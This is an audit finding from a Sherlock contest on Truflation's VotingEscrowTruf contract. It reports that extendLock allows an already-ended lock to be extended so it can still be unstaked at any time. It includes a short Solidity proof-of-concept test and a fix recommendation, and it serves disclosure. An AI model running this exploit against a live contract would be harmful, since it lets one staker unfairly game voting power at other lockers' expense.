# mstpr-brainbot - Ended locks can be extended

**Severity:** medium
**Auditor:** Sherlock
**Protocol:** Truflation
**Keywords:** cyber security, vulnerability, lock period, extension, block.timestamp, unstakeable, expired lock, extendLock function, checks, impact, gaming the system, unfair behavior, locker, manual review, recommendation, security flaw, smart contract, risk assessment, stakeholder, protocol integrity

---

mstpr-brainbot

high

# Ended locks can be extended

## Summary
When a lock period ends, it can be extended. If the new extension \u0027end\u0027 is earlier than the current block.timestamp, the user will have a lock that can be unstaked at any time."
## Vulnerability Detail
When the lock period ends, the owner of the expired lock can extend it to set a new lock end that is earlier than the current block.timestamp. By doing so, the lock owner can create a lock that is unstakeable at any time.

This is doable because there are no checks in the [extendLock](https://github.com/sherlock-audit/2023-12-truflation/blob/37ddbb69e0c7fb6510f1ec99162fd9172ec44733/truflation-contracts/src/token/VotingEscrowTruf.sol#L333-L366) function that checks whether the lock is already ended or not. 

PoC:
\u0060\u0060\u0060solidity
function test_ExtendLock_AlreadyEnded() external {
        uint256 amount = 100e18;
        uint256 duration = 5 days;

        _stake(amount, duration, alice, alice);

        // 5 days later, lock is ended for Alice
        skip(5 days + 1);

        (,, uint128 _ends,,) = veTRUF.lockups(alice, 0);

        // Alice\u0027s lock is indeed ended
        assertTrue(_ends < block.timestamp, "lock is ended");

        // 36 days passed  
        skip(36 days);

        // Alice extends her already finished lock 30 more days
        vm.prank(alice);
        veTRUF.extendLock(0, 30 days);

        (,,_ends,,) = veTRUF.lockups(alice, 0);

        // Alice\u0027s lock can be easily unlocked right away
        assertTrue(_ends < block.timestamp, "lock is ended");

        // Alice unstakes her lock, basically alice can unstake her lock anytime she likes
        vm.prank(alice);
        veTRUF.unstake(0);
    }
\u0060\u0060\u0060
## Impact
The owner of the lock will achieve points that he can unlock anytime. This is clearly a gaming of the system and shouldn\u0027t be acceptable behaviour. A locker having a "lock" that can be unstaked anytime will be unfair for the other lockers. Considering this, I\u0027ll label this as high.
## Code Snippet
https://github.com/sherlock-audit/2023-12-truflation/blob/37ddbb69e0c7fb6510f1ec99162fd9172ec44733/truflation-contracts/src/token/VotingEscrowTruf.sol#L333-L366
## Tool used

Manual Review

## Recommendation
Do not let extension of locks that are already ended.
